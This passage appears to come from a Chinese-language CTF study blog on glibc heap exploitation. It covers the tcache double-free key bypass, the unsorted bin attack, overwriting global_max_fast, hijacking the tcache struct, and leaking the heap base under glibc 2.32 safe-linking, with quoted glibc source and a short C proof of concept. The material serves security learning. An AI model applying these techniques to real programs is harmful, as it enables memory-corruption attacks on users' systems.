	    <span class="token keyword">for</span> <span class="token punctuation">(</span>tmp <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
		 tmp<span class="token punctuation">;</span>
		 tmp <span class="token operator">=</span> tmp<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token comment">//循环所有key相等的块</span>
	      <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">==</span> e<span class="token punctuation">)</span><span class="token comment">//如果有块等于要free的块</span>
		<span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"free(): double free detected in tcache 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//报错，double free</span>
	    <span class="token comment">/* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */</span>
	  <span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span>
	  <span class="token punctuation">&#123;</span>
	    <span class="token function">tcache_put</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token keyword">return</span><span class="token punctuation">;</span>
	  <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概意思就是tcache有个key，如果你要去free一个chunk，那么就会判断，这个chunk是不是tcache，如果key和tcache相等就会遍历所有key相等的chunk，如果有相等的，就会爆出double free的错误。但是，当我们有UAF的时候，可以轻松绕过。</p>
<p>poc</p>
<pre class="line-numbers language-none"><code class="language-none">1 malloc
2 free
3 修改key字段为别的值。
4 再次free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里拿一个师傅的demo来做例子</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">size_t</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span>ptx<span class="token punctuation">;</span>
	ptr1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//free一个chunk</span>

	<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只是为了打断点，没别的用。</span>
	ptx<span class="token operator">=</span>ptr1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prt1[1]=>0x%llx"</span><span class="token punctuation">,</span>ptx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	ptr1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>ptx<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//将chunk的key的值-8;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//测试</span>
	<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不一定要减去8，只要不是现在这个都可以。</p>
<p>然后调试发现，ptr1[1]这个位置好像是tachebin存储idx的地方。然后的话，构成双向链表之后，show函数是很好去泄露堆地址的，泄露堆地址之后<strong>我也不知道干啥</strong></p>
<p>有了，，，，tcache中，第一次申请tcache之后，会先申请一个0x250大小的chunk，记录每个tcache bin 链表的信息。double free形成之后，利用fd指针，把堆申请到这个0x250的chunk去，然后修改tcache bin的信息，让某个链表变满，然后再次free同大小的chunk就可以free进去unsorted bin了。</p>
<p><strong>此外</strong>还有一种方法绕过，double free之后 malloc三次，tcache的记录就是-1，然后再次free同大小的chunk就会free进去unsorted bin。</p>
<h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p>unsorted bin多用来泄露地址，但也有别的用法，关于unsorted bin首先，可以和<code>top chunk</code>合并，然后值得注意的是</p>
<p><strong>相同size的chunk进入unsortedbin会进行合并</strong></p>
<p>考虑到当我们将 tcache struct 送入 unsorted bin 中之后，其上会残留 main_arena 附近 的指针，而这个指针和 <code>stdout</code> 离得很近</p>
<p>可以利用unsorted bin 的切割拿到stdout附近的指针，从而对其劫持。</p>
<p><strong>此外</strong>unsorted chunk会和topchunk合并，先进先出，从头部操作。泄露main_arena的话，可以查看libc里面<code>malloc_trim</code>的地址，或者利用<code>malloc_hook</code>算出来，</p>
<p><code>main_arena_offset = ELF(&quot;libc.so.6&quot;).symbols[&quot;__malloc_hook&quot;] + 0x10</code></p>
<p>访问链表尾可以获得fd就可以泄露libc，但是，如果是链表头的话printf在64位往往会被截断。</p>
<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>malloc有一段这样的代码，</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* remove from unsorted list */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>类似于unlink的解链操作。而</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>
        <span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span> <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span>
                        <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
    size <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*
       If a small request, try to use last remainder if it is the
       only chunk in unsorted bin.  This helps promote locality for
       runs of consecutive small requests. This is the only
       exception to best-fit, and applies only when there is
       no exact fit for a small chunk.
     */</span>
    <span class="token comment">/* 显然，bck被修改，并不符合这里的要求*/</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_rage</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bck <span class="token operator">==</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        victim <span class="token operator">==</span> av<span class="token operator">-></span>last_remainder <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* remove from unsorted list */</span>
    <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
    bck<span class="token operator">-></span>fd                 <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不难发现，在unsorted chunk解链的过程中，victim的fd似乎没有任何作用，所以可以控制fd，然后指向一个位置，利用解链操作就可以实现attack，这里确实可以和<code>off_by_one</code>形成一些<code>unlink</code>攻击，利用的是malloc的时候，回去unsorted bin里面一个一个的寻找chunk，如果不符合就解链把chunk送到合适的bin里面去。</p>
<p>但是这里写入的是一个地址，就是可以给一个地址写入一个超级大的变量，但是我们无法控制这一块地址。</p>
<h3 id="特殊利用"><a href="#特殊利用" class="headerlink" title="特殊利用"></a>特殊利用</h3><p>利用 unsorted bin attack ，修改 global_max_fast 全局变量，由于 global_max_fast  变量为控制最大的 Fast chunk 的大小，将这里改写为 unsorted bin 的地址 (一般来说是一个很大的正数)，就能使之后的  chunk 都被当作 fast chunk，即可进行 Fast bin attack。</p>
<h2 id="tcache-管理器的利用"><a href="#tcache-管理器的利用" class="headerlink" title="tcache 管理器的利用"></a>tcache 管理器的利用</h2><p><img src="https://i.bmp.ovh/imgs/2021/05/6614988d4c0429fe.png" loading="lazy"></p>
<p>分析知道，从对管理器chunk的fd开始每个字节代表一个大小的tcache,从0x20开始一共64个字节，64个tcache链，然后每个链表的头都会记录在这个管理器里面。我们可以利用uaf等漏洞，把chunk分配到这上面来，从而控制tcache_entry。</p>
<p>关于<code>libc2.32中</code>tcache管理器的不同，</p>
<p><strong>在libc2.27中</strong>，tcache管理器只有0x250的大小，然后tcache的fd什么的也类似fastbin，但是调试ff的时候发现，fd非常的混乱，但是heapinfo(pwngdb)和fd显示的内容不一样，我就想知道为什么，找了一些资料。</p>
<p><strong>libc2.32</strong>中的tcache管理器大小是0x290，多了0x40。先不看这里，那为什么fd不是我们期望的值呢？</p>
<p>看下面<code>libc2.32</code>新增的保护（<code>glibc2.31</code>以下没有）</p>
<h4 id="glibc-2-32下的-tcache-put-与-tcache-get"><a href="#glibc-2-32下的-tcache-put-与-tcache-get" class="headerlink" title="glibc 2.32下的 tcache_put 与 tcache_get"></a>glibc 2.32下的 tcache_put 与 tcache_get</h4><p>在tcache取出和存放的时候加了一层保护，在 <code>glibc 2.32</code> 中引入了一个简单的异或加密机制：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Caller must ensure that we know tc_idx is valid and there's room
for more chunks.  */</span>
<span class="token keyword">static</span> __always_inline <span class="token keyword">void</span>
<span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* Mark this chunk as "in the tcache" so the test in _int_free will
  detect a double free.  */</span>
e<span class="token operator">-></span>key <span class="token operator">=</span> tcache<span class="token punctuation">;</span>

e<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token function">PROTECT_PTR</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>e<span class="token operator">-></span>next<span class="token punctuation">,</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
<span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/* Caller must ensure that we know tc_idx is valid and there's
available chunks to remove.  */</span>
<span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span>
<span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">aligned_OK</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): unaligned tcache chunk detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">REVEAL_PTR</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
e<span class="token operator">-></span>key <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>新增了在从 tcache 中取出 chunk 时会检测 chunk 地址是否对齐的保护(<code>aligned_ok</code>)</li>
<li>引入了两个新的宏对 tcache 中<code>存/取</code> chunk 的操作进行了一层保护，即在 new chunk 链接 tcache 中 old chunk 时会进行一次异或运算，代码如下：</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#define PROTECT_PTR(pos, ptr) \</span>
<span class="token punctuation">(</span><span class="token punctuation">(</span>__typeof <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> pos<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>即 tcache_entry-&gt;next中存放的chunk地址为 next的地址右移12位与当前tcache_entry地址进行异或运算后所得到的值， 这就要求我们在利用 tcache_entry 进行任意地址写之前 需要我们提前泄漏出相应 chunk 的地址，即我们需要提前获得堆基址后才能进行任意地址写，这给传统的利用方式无疑是增加了不少的难度</p>
<p>不过若是我们能够直接控制 tcache struct，则仍然可以直接进行任意地址写，这是因为在 tcache struct 中存放的仍是未经异或运算的原始 chunk 地址</p>
</blockquote>
<p>那么就有了新的利用方法。</p>
<h4 id="leak-heap-base"><a href="#leak-heap-base" class="headerlink" title="leak heap_base"></a>leak heap_base</h4><p>当我们malloc第一个chunk的时候，当前地址位NULL，下一个chunk的地址就是堆地址，移12位之后异或，得到的就是<code>heap_base</code>所以实际上对堆基址的泄露更加简单了</p>
<p>具体的利用看vnctf2021 ff。</p>
<h3 id="tcache从0到1"><a href="#tcache从0到1" class="headerlink" title="tcache从0到1"></a>tcache从0到1</h3><p>首先看一下这个的结构体吧</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  *&#x2F;
typedef struct tcache_entry
&#123;
  struct tcache_entry *next;
&#125; tcache_entry;

&#x2F;* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  *&#x2F;
typedef struct tcache_perthread_struct
&#123;
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
&#125; tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache &#x3D; NULL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>tcahce_struct结构体声明和我们想的一样，前面是存储counts的数组，后面是链表头。tcache里面只有一个next指针</p>
<p>再看两个函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>
<span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关于puts，没有检查size域啥的，只检查了大小。然后加入到链表头get的话，从头取出，也没有具体的判定，根据malloc的申请量获得idx,然后直接从链表头取出。</p>
<p>这两个函数在int_malloc 和 int_free之前会被调用。</p>
<p><strong>利用点在malloc</strong>申请的时候，tcache没有的时候也有别的来源</p>
<ul>
<li>fastbin，如果有符合大小的chunk，会返回chunk，然后把当前链表剩下的放到tcache里面。</li>
<li>smallbin 同理</li>
<li>unsorted bin里面的时候当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</li>
</ul>
<p>fastbin有一种攻击手法针对这个，先看源码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      idx <span class="token operator">=</span> <span class="token function">fastbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
      mfastbinptr <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
      mchunkptr pp<span class="token punctuation">;</span>
      victim <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>SINGLE_THREAD_P<span class="token punctuation">)</span>
        <span class="token operator">*</span>fb <span class="token operator">=</span> victim<span class="token operator">-></span>fd<span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        <span class="token function">REMOVE_FB</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> pp<span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_likely</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token class-name">size_t</span> victim_idx <span class="token operator">=</span> <span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim_idx <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
              <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">check_remalloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span>
          <span class="token comment">/* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */</span>
          <span class="token class-name">size_t</span> tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          mchunkptr tc_victim<span class="token punctuation">;</span>

          <span class="token comment">/* While bin not empty and tcache not full, copy chunks.  */</span>
          <span class="token keyword">while</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count
            <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>SINGLE_THREAD_P<span class="token punctuation">)</span>
               <span class="token operator">*</span>fb <span class="token operator">=</span> tc_victim<span class="token operator">-></span>fd<span class="token punctuation">;</span>
              <span class="token keyword">else</span>
              <span class="token punctuation">&#123;</span>
                <span class="token function">REMOVE_FB</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> pp<span class="token punctuation">,</span> tc_victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                  <span class="token keyword">break</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token function">tcache_put</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> p<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
